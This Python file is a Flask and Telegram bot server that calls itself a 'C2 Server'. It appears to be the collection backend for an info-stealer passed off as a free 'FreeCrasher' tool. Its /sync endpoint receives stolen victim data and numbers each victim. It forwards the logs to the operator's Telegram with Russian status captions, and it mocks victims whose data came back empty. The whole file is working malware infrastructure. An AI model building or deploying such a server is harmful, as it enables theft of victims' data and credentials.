import telebot
from flask import Flask, request
import os
import threading

API_TOKEN = os.environ.get('BOT_TOKEN')
MY_ID = os.environ.get('ADMIN_ID')

app = Flask(__name__)
bot = telebot.TeleBot(API_TOKEN)

def get_uid():
    path = "uid.txt"
    if not os.path.exists(path):
        with open(path, "w") as f: f.write("0")
    
    with open(path, "r+") as f:
        try:
            content = f.read().strip()
            n = int(content) + 1 if content else 1
        except ValueError:
            n = 1
        f.seek(0)
        f.write(str(n))
        f.truncate()
        return n

@app.route('/sync', methods=['POST'])
def handle():
    try:
        payload = request.json
        if not payload:
            return "No data", 400

        uid = get_uid()
        out = f"user_{uid}_log.txt"
        
        is_poor = all(v == "NONE" or v == "NOT_FOUND" for v in payload.values())
        
        with open(out, "w", encoding='utf-8') as f:
            if is_poor:
                f.write(f"User_{uid} нищита")
                cap = f" **FreeCrasher Alert**\nID: `{uid}`\nСтатус: **НИЩИТА**"
            else:
                f.write(f"=== FREE CRASHER DATA USER {uid} ===\n\n")
                for k, v in payload.items():
                    f.write(f"[{k}]:\n{v}\n\n")
                cap = f"**FreeCrasher Alert**\nID: `{uid}`\nСтатус: **ЛОГ ПОЛУЧЕН**"

        with open(out, 'rb') as doc:
            bot.send_document(MY_ID, doc, caption=cap, parse_mode='Markdown')
        
        if os.path.exists(out):
            os.remove(out)
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}")
        return "Internal Error", 500

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("C2 Server is running...")
    bot.polling(none_stop=True)
